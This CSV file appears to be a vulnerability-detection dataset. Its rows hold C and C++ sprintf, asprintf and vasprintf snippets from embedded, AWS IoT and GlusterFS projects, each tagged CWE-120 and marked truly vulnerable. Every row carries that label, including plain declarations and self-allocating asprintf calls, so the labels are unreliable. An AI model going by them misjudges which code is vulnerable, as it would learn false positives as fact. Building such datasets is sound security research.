GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\ArduinoUno-Blynk-Proteus\src\main.cpp,Dataset Download,../../Dataset Download/2021\ArduinoUno-Blynk-Proteus\src\main.cpp,"sprintf(buffer, ""%02d/%02d/%04d %02d:%02d:%02d"", now.day(), now.month(), now.year(), now.hour(), now.minute(), now.second());",120,1,"    DateTime now = rtc.now();
    char buffer[30] = """";
    sprintf(buffer, ""%02d/%02d/%04d %02d:%02d:%02d"", now.day(), now.month(), now.year(), now.hour(), now.minute(), now.second());
    SwSerial.print(buffer);
    SwSerial.println();
"
2021\aws-edukit-example\components\core2forAWS\core2forAWS.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\core2forAWS.c,"sprintf(px.color_order, ""GRBW"");",120,1,"    px.pixel_count = 10;
    px.brightness = 20;
    sprintf(px.color_order, ""GRBW"");
    px.nbits = 24;
    px.timings.t0h = (350);
"
2021\aws-edukit-example\components\core2forAWS\atecc608\atecc608.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\atecc608\atecc608.c,"sprintf(sn + i * 2, ""%02x"", serial[i]);",120,1,"
    for (size_t i = 0; i < ATCA_SERIAL_NUM_SIZE; i++)
        sprintf(sn + i * 2, ""%02x"", serial[i]);
    return ret;
}
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\tests\lv_test_assert.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\tests\lv_test_assert.c,"sprintf(fn_ref_full, ""%s%s"", REF_IMGS_PATH, fn_ref);",120,1,"
    char fn_ref_full[512];
    sprintf(fn_ref_full, ""%s%s"", REF_IMGS_PATH, fn_ref);

    png_img_t p;
"
2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,"sprintf(cPayload, ""%s : %d "", ""hello from SDK"", i);",120,1,"	}

	sprintf(cPayload, ""%s : %d "", ""hello from SDK"", i);

	paramsQOS0.qos = QOS0;
"
2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,"sprintf(cPayload, ""%s : %d "", ""hello from SDK QOS0"", i++);",120,1,"		IOT_INFO(""-->sleep"");
		sleep(1);
		sprintf(cPayload, ""%s : %d "", ""hello from SDK QOS0"", i++);
		paramsQOS0.payloadLen = strlen(cPayload);
		rc = aws_iot_mqtt_publish(&client, ""sdkTest/sub"", 11, &paramsQOS0);
"
2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,"sprintf(cPayload, ""%s : %d "", ""hello from SDK QOS1"", i++);",120,1,"		}

		sprintf(cPayload, ""%s : %d "", ""hello from SDK QOS1"", i++);
		paramsQOS1.payloadLen = strlen(cPayload);
		rc = aws_iot_mqtt_publish(&client, ""sdkTest/sub"", 11, &paramsQOS1);
"
2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\tests\integration\src\aws_iot_test_multiple_clients.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\tests\integration\src\aws_iot_test_multiple_clients.c,"sprintf(cPayload, ""%d"", itr + 1);",120,1,"
	for(itr = 0; itr < PUBLISH_COUNT; itr++) {
		sprintf(cPayload, ""%d"", itr + 1);
		params.payload = (void *) cPayload;
		params.payloadLen = strlen(cPayload) + 1;
"
2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\tests\unit\src\aws_iot_tests_unit_publish_helper.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\tests\unit\src\aws_iot_tests_unit_publish_helper.c,"sprintf(cPayload, ""%s : %d "", ""hello from SDK"", 0);",120,1,"	testPubMsgParams.qos = QOS1;
	testPubMsgParams.isRetained = 0;
	sprintf(cPayload, ""%s : %d "", ""hello from SDK"", 0);
	testPubMsgParams.payload = (void *) cPayload;
	testPubMsgParams.payloadLen = strlen(cPayload);
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,"sprintf(hid_filter, ""vid_%04x&pid_%04x"", cfg->atcahid.vid, cfg->atcahid.pid);",120,1,"    // Create the HID filter string
    memset(hid_filter, 0, sizeof(hid_filter));
    sprintf(hid_filter, ""vid_%04x&pid_%04x"", cfg->atcahid.vid, cfg->atcahid.pid);

    // Find the available kit USB devices
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,"sprintf(device_hid, ""vid_%s&pid_%s"",",120,1,"        // Create the device HID string
        memset(device_hid, 0, sizeof(device_hid));
        sprintf(device_hid, ""vid_%s&pid_%s"",
                udev_device_get_sysattr_value(device, ""idVendor""),
                udev_device_get_sysattr_value(device, ""idProduct""));
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_win_kit_hid.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_win_kit_hid.c,"_stprintf(hid_filter, _T(""vid_%04x&pid_%04x""), cfg->atcahid.vid, cfg->atcahid.pid);",120,1,"    // Construct the filter string
    memset(hid_filter, 0, sizeof(hid_filter));
    _stprintf(hid_filter, _T(""vid_%04x&pid_%04x""), cfg->atcahid.vid, cfg->atcahid.pid);

    // Find the Microchip CryptoAuthentication kit protocol devices
"
2021\aws-edukit-example\main\display.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\display.c,"sprintf(buf, baseTxt, param);",120,1,"                size_t *bufLen = baseTxtLen + paramLen;
                char buf[(int)bufLen];
                sprintf(buf, baseTxt, param);
                lv_textarea_add_text(out_txtarea, buf);
            }
"
2021\aws-edukit-example\main\display.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\display.c,"sprintf(buffer, ""#0000ff %s #"", LV_SYMBOL_WIFI);",120,1,"    {
        char buffer[25];
        sprintf(buffer, ""#0000ff %s #"", LV_SYMBOL_WIFI);
        lv_label_set_text(wifi_label, buffer);
    }
"
2021\aws-edukit-example\main\network.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\network.c,"sprintf(buffer, ""Network: "" IPSTR ""\n"", IP2STR(&event->event_info.got_ip.ip_info.ip));",120,1,"
        char buffer[36];
        sprintf(buffer, ""Network: "" IPSTR ""\n"", IP2STR(&event->event_info.got_ip.ip_info.ip));

        display_textarea_add(buffer, NULL, NULL);
"
2021\aws-edukit-example\main\network.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\network.c,"sprintf(subTopic, ""%s/#"", clientId);",120,1,"    char subTopic[clientIdLength + 2];
    char pubTopic[clientIdLength + 1];
    sprintf(subTopic, ""%s/#"", clientId);
    sprintf(pubTopic, ""%s/"", clientId);

"
2021\aws-edukit-example\main\network.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\network.c,"sprintf(pubTopic, ""%s/"", clientId);",120,1,"    char pubTopic[clientIdLength + 1];
    sprintf(subTopic, ""%s/#"", clientId);
    sprintf(pubTopic, ""%s/"", clientId);

    mqttInitParams.mqttCommandTimeout_ms = 20000;
"
2021\aws-edukit-example\main\network.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\network.c,"sprintf(cPayload, ""{\""message\"": \""Moin!\"", \""type\"": \""QOS0\"", \""counter\"": %d}"", i++);",120,1,"        //
        // Publish and ignore if ""ack"" was received or from AWS IoT Core
        sprintf(cPayload, ""{\""message\"": \""Moin!\"", \""type\"": \""QOS0\"", \""counter\"": %d}"", i++);
        paramsQOS0.payloadLen = strlen(cPayload);
        rc = aws_iot_mqtt_publish(&client, pubTopic, pubTopicLength, &paramsQOS0);
"
2021\aws-edukit-example\main\network.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\network.c,"sprintf(cPayload, ""{\""message\"": \""Moin!\"", \""type\"": \""QOS1\"", \""counter\"": %d}"", i++);",120,1,"        //
        // Publish and check if ""ack"" was sent from AWS IoT Core
        sprintf(cPayload, ""{\""message\"": \""Moin!\"", \""type\"": \""QOS1\"", \""counter\"": %d}"", i++);
        paramsQOS1.payloadLen = strlen(cPayload);
        rc = aws_iot_mqtt_publish(&client, pubTopic, pubTopicLength, &paramsQOS1);
"
2021\boxofhope\io_server\src\io_nfc.cpp,Dataset Download,../../Dataset Download/2021\boxofhope\io_server\src\io_nfc.cpp,"sprintf(tagStr, ""%02x"", data);",120,1,"        auto data = tag.nti.nai.abtUid;
        char tagStr[20];
        sprintf(tagStr, ""%02x"", data);

        API::MaskState().update(true);
"
2021\c-vertices-sdk\src\algorand\algorand_provider.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\algorand\algorand_provider.c,"int ret = sprintf(relative_path, ""/v2/accounts/%s?format=msgpack"", account->info->public_b32);",120,1,"    char relative_path[128] = {0};

    int ret = sprintf(relative_path, ""/v2/accounts/%s?format=msgpack"", account->info->public_b32);
    VTC_ASSERT_BOOL(ret < 128 && ret >= 0);

"
2021\c-vertices-sdk\src\algorand\algorand_provider.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\algorand\algorand_provider.c,"sprintf(header, ""%s\r\nContent-Type: application/x-binary"", m_provider.provider.header);",120,1,"    char header[256] = {0};
    int ret =
        sprintf(header, ""%s\r\nContent-Type: application/x-binary"", m_provider.provider.header);
    VTC_ASSERT_BOOL(ret < 128 && ret >= 0);

"
2021\c-vertices-sdk\src\http\http_curl.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\http\http_curl.c,"sprintf(url_full, ""%s%s"", provider->url, relative_path);",120,1,"
    char url_full[512] = {0};
    sprintf(url_full, ""%s%s"", provider->url, relative_path);

    if (m_curl)
"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"extern int sprintf (char *__restrict __s,",120,1,"extern int printf (const char *__restrict __format, ...);

extern int sprintf (char *__restrict __s,
      const char *__restrict __format, ...) __attribute__ ((__nothrow__));

"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"extern int vsprintf (char *__restrict __s, const char *__restrict __format,",120,1,"extern int vprintf (const char *__restrict __format, __gnuc_va_list __arg);

extern int vsprintf (char *__restrict __s, const char *__restrict __format,
       __gnuc_va_list __arg) __attribute__ ((__nothrow__));

"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"sprintf (&buf[j], ""%02hhx"", lkowner->data[i]);",120,1,"                        j++;
                }
                sprintf (&buf[j], ""%02hhx"", lkowner->data[i]);
                j += 2;
                if (j == buf_len)
"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"gf_vasprintf (char **string_ptr, const char *format, va_list arg);",120,1,"
int
gf_vasprintf (char **string_ptr, const char *format, va_list arg);

int
"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"gf_asprintf (char **string_ptr, const char *format, ...);",120,1,"
int
gf_asprintf (char **string_ptr, const char *format, ...);

void
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&port_str, ""%d"", port);",120,1,"                hints.ai_socktype = SOCK_STREAM;

                ret = gf_asprintf (&port_str, ""%d"", port);
                if (-1 == ret) {
                        return -1;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = vasprintf (&msg, fmt, ap);",120,1,"
        __builtin_va_start(ap,fmt);
        ret = vasprintf (&msg, fmt, ap);
        __builtin_va_end(ap);
        if (-1 == ret)
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"len += sprintf (subvstr + len, ""%s%s"", subv->xlator->name,",120,1," len = 0;
 for (subv = this->children; subv; subv= subv->next)
  len += sprintf (subvstr + len, ""%s%s"", subv->xlator->name,
    subv->next ? "" "" : """");

"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"sprintf (msg,""frame : type(%d) op(%s)"",",120,1,"                                                 {
                        if (stack->type == GF_OP_TYPE_FOP)
                                sprintf (msg,""frame : type(%d) op(%s)"",
                                         stack->type,
                                         gf_fop_list[stack->op]);
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"sprintf (msg,""frame : type(%d) op(%d)"",",120,1,"                                         gf_fop_list[stack->op]);
                        else
                                sprintf (msg,""frame : type(%d) op(%d)"",
                                         stack->type,
                                         stack->op);
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"sprintf (msg, ""patchset: %s"", ""git:",120,1,"        }

        sprintf (msg, ""patchset: %s"", ""git://git.gluster.com/glusterfs.git"");
        do { _gf_msg_plain_nomem (GF_LOG_ALERT, msg); } while (0);

"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"sprintf (msg, ""signal received: %d"", signum);",120,1,"        do { _gf_msg_plain_nomem (GF_LOG_ALERT, msg); } while (0);

        sprintf (msg, ""signal received: %d"", signum);
        do { _gf_msg_plain_nomem (GF_LOG_ALERT, msg); } while (0);
        {
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"sprintf (msg, ""---------"");",120,1,"        gf_dump_config_flags ();
        do { _gf_msg_backtrace_nomem (GF_LOG_ALERT, 200); } while (0);
        sprintf (msg, ""---------"");
        do { _gf_msg_plain_nomem (GF_LOG_ALERT, msg); } while (0);

"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%.1lfPB"", ((double) n)/1125899906842624ULL);",120,1,"
        if (n >= 1125899906842624ULL) {
                ret = gf_asprintf (&str, ""%.1lfPB"", ((double) n)/1125899906842624ULL);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%.1lfTB"", ((double) n)/1099511627776ULL);",120,1,"                        goto err;
        } else if (n >= 1099511627776ULL) {
                ret = gf_asprintf (&str, ""%.1lfTB"", ((double) n)/1099511627776ULL);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%.1lfGB"", ((double) n)/1073741824ULL);",120,1,"                        goto err;
        } else if (n >= 1073741824ULL) {
                ret = gf_asprintf (&str, ""%.1lfGB"", ((double) n)/1073741824ULL);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%.1lfMB"", ((double) n)/1048576ULL);",120,1,"                        goto err;
        } else if (n >= 1048576ULL) {
                ret = gf_asprintf (&str, ""%.1lfMB"", ((double) n)/1048576ULL);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%.1lfKB"", ((double) n)/1024ULL);",120,1,"                        goto err;
        } else if (n >= 1024ULL) {
                ret = gf_asprintf (&str, ""%.1lfKB"", ((double) n)/1024ULL);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%luBytes"", n);",120,1,"                        goto err;
        } else {
                ret = gf_asprintf (&str, ""%luBytes"", n);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&cmd_args->log_file,",120,1,"                }

                ret = gf_asprintf (&cmd_args->log_file,
                                   DATADIR ""/log/glusterfs"" ""/%s.log"",
                                   tmp_str);
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&cmd_args->log_ident, ""%s"", ptr + 1);",120,1,"
        if (((void *)0) != (ptr = strrchr (cmd_args->log_file, '/'))) {
                ret = gf_asprintf (&cmd_args->log_ident, ""%s"", ptr + 1);
        } else {
                ret = gf_asprintf (&cmd_args->log_ident, ""%s"",
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&cmd_args->log_ident, ""%s"",",120,1,"                ret = gf_asprintf (&cmd_args->log_ident, ""%s"", ptr + 1);
        } else {
                ret = gf_asprintf (&cmd_args->log_ident, ""%s"",
                                   cmd_args->log_file);
        }
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&key, ""ref:%p"", value);",120,1,"
        if (!key) {
                ret = gf_asprintf (&key, ""ref:%p"", value);
                if (-1 == ret) {
                        return -1;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%d"", value);",120,1,"                return ((void *)0);
        }
        ret = gf_asprintf (&data->data, ""%d"", value);
        if (-1 == ret) {
                do { _gf_msg (""dict"", ""./dict.c"", __FUNCTION__, 745, GF_LOG_DEBUG, 0, 0, 0, ""asprintf failed""); } while (0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%""""d"", value);",120,1,"                return ((void *)0);
        }
        ret = gf_asprintf (&data->data, ""%""""d"", value);
        if (-1 == ret) {
                do { _gf_msg (""dict"", ""./dict.c"", __FUNCTION__, 725, GF_LOG_DEBUG, 0, 0, 0, ""asprintf failed""); } while (0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%""""l"" ""d"", value);",120,1,"                return ((void *)0);
        }
        ret = gf_asprintf (&data->data, ""%""""l"" ""d"", value);
        if (-1 == ret) {
                do { _gf_msg (""dict"", ""./dict.c"", __FUNCTION__, 686, GF_LOG_DEBUG, 0, 0, 0, ""asprintf failed""); } while (0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%""""u"", value);",120,1,"                return ((void *)0);
        }
        ret = gf_asprintf (&data->data, ""%""""u"", value);
        if (-1 == ret) {
                return ((void *)0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%""""l"" ""u"", value);",120,1,"                return ((void *)0);
        }
        ret = gf_asprintf (&data->data, ""%""""l"" ""u"", value);
        if (-1 == ret) {
                do { _gf_msg (""dict"", ""./dict.c"", __FUNCTION__, 765, GF_LOG_DEBUG, 0, 0, 0, ""asprintf failed""); } while (0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%f"", value);",120,1,"        }

        ret = gf_asprintf (&data->data, ""%f"", value);
        if (ret == -1) {
                return ((void *)0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"gf_asprintf (char **string_ptr, const char *format, ...)",120,1,"} __pthread_unwind_buf_t __attribute__ ((__aligned__));

gf_asprintf (char **string_ptr, const char *format, ...)
{
        va_list arg;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"rv = gf_vasprintf (string_ptr, format, arg);",120,1,"
        __builtin_va_start(arg,format);
        rv = gf_vasprintf (string_ptr, format, arg);
        __builtin_va_end(arg);

"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"gf_vasprintf (char **string_ptr, const char *format, va_list arg)",120,1,"};

gf_vasprintf (char **string_ptr, const char *format, va_list arg)
{
        va_list arg_save;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"size = vasprintf (&str, fmt, ap);",120,1,"        int size = 0;

        size = vasprintf (&str, fmt, ap);

        if (size < 0)
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"extern int vasprintf (char **__restrict __ptr, const char *__restrict __f,",120,1,"}

extern int vasprintf (char **__restrict __ptr, const char *__restrict __f,
        __gnuc_va_list __arg)
     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 2, 0))) ;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"extern int __asprintf (char **__restrict __ptr,",120,1,"        __gnuc_va_list __arg)
     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 2, 0))) ;
extern int __asprintf (char **__restrict __ptr,
         const char *__restrict __fmt, ...)
     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 2, 3))) ;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"extern int asprintf (char **__restrict __ptr,",120,1,"         const char *__restrict __fmt, ...)
     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 2, 3))) ;
extern int asprintf (char **__restrict __ptr,
       const char *__restrict __fmt, ...)
     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 2, 3))) ;
"
2021\cslim\test\libglusterfs\compat.h,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.h,"extern int vasprintf (char **__restrict __ptr, const char *__restrict __f,;",120,1,"extern char *strncpy (char *__restrict __dest,;
strfd_close (strfd_t *strfd);
extern int vasprintf (char **__restrict __ptr, const char *__restrict __f,;
gf_roundup_next_power_of_two (int32_t nr);
__gf_realloc (void *ptr, size_t size);
"
2021\cslim\test\libglusterfs\graph-print.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\graph-print.cpp.c,"ret = gf_vasprintf (&str, format, arg);",120,1,"
        __builtin_va_start(arg,format);
        ret = gf_vasprintf (&str, format, arg);
        __builtin_va_end(arg);

"
2021\cslim\test\libglusterfs\graph.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\graph.cpp.c,"sprintf(strpos, ""%d"", pos);",120,1,"                if (pos < 0)
                        goto out;
                sprintf(strpos, ""%d"", pos);

                err = dict_set_static_ptr(leaves, strpos, base);
"
2021\cslim\test\libglusterfs\inode.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\inode.cpp.c,"ret = gf_asprintf (&new->name, ""%s/inode"", xl->name);",120,1,"        do { (&new->purge)->next = (&new->purge)->prev = &new->purge; } while (0);

        ret = gf_asprintf (&new->name, ""%s/inode"", xl->name);
        if (-1 == ret) {

"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"if (vasprintf (&msg, format, ap) != -1) {",120,1,"
        __builtin_va_start(ap,format);
        if (vasprintf (&msg, format, ap) != -1) {
                p = _json_escape (msg, json_msg, 8192);
                syslog (facility_priority, ""%s"", msg);
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"syslog (GF_LOG_CRITICAL, ""vasprintf() failed, out of memory?"");",120,1,"                free (msg);
        } else
                syslog (GF_LOG_CRITICAL, ""vasprintf() failed, out of memory?"");
        __builtin_va_end(ap);
}
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"vasprintf (&str2, fmt, ap);",120,1,"
                __builtin_va_start(ap,fmt);
                vasprintf (&str2, fmt, ap);
                __builtin_va_end(ap);

"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&str1, ""[%s] %s [%s:%d:%s] %s %d-%s: "",",120,1,"                  "".%""""06ld"", tv.tv_usec);

        ret = gf_asprintf (&str1, ""[%s] %s [%s:%d:%s] %s %d-%s: "",
                           timestr, level_strings[level],
                           basename, line, function, callstr,
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = vasprintf (&str2, fmt, ap);",120,1,"        }

        ret = vasprintf (&str2, fmt, ap);
        if (-1 == ret) {
                goto out;
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&header, ""[%s] %s [%s:%d:%s]""",120,1,"        if (fmt == gf_logformat_traditional) {
                if (!callstr) {
                        ret = gf_asprintf (&header, ""[%s] %s [%s:%d:%s]""
                                                    "" %d-%s: "",
                                           timestr, gf_level_strings[level],
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&header, ""[%s] %s [%s:%d:%s] %s""",120,1,"                                           domain);
                } else {
                        ret = gf_asprintf (&header, ""[%s] %s [%s:%d:%s] %s""
                                                    "" %d-%s: "",
                                           timestr, gf_level_strings[level],
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&header, ""[%s] %s [MSGID: %""""l"" ""u""""]""",120,1,"
                if (!callstr) {
                        ret = gf_asprintf (&header, ""[%s] %s [MSGID: %""""l"" ""u""""]""
                                                    "" [%s:%d:%s] %d-%s: "",
                                           timestr, gf_level_strings[level],
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&footer, "" [%s]"",strerror(errnum));",120,1,"
        if (errnum) {
                ret = gf_asprintf (&footer, "" [%s]"",strerror(errnum));
                if (-1 == ret) {
                        goto err;
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&header, ""The message \""%s [MSGID: %""""l"" ""u""""]""",120,1,"                  "".%""""06ld"", oldest.tv_usec);

        ret = gf_asprintf (&header, ""The message \""%s [MSGID: %""""l"" ""u""""]""
                           "" [%s:%d:%s] %d-%s: "", gf_level_strings[level],
                           msgid, file, line, function, graph_id, domain);
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&footer, ""%s\"" repeated %d times between""",120,1,"                          strerror (errnum));

        ret = gf_asprintf (&footer, ""%s\"" repeated %d times between""
                           "" [%s] and [%s]"", errstr, refcount, timestr_oldest,
                           timestr_latest);
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = vasprintf (&msgstr, fmt, ap);",120,1,"
        __builtin_va_start(ap,fmt);
        ret = vasprintf (&msgstr, fmt, ap);
        __builtin_va_end(ap);

"
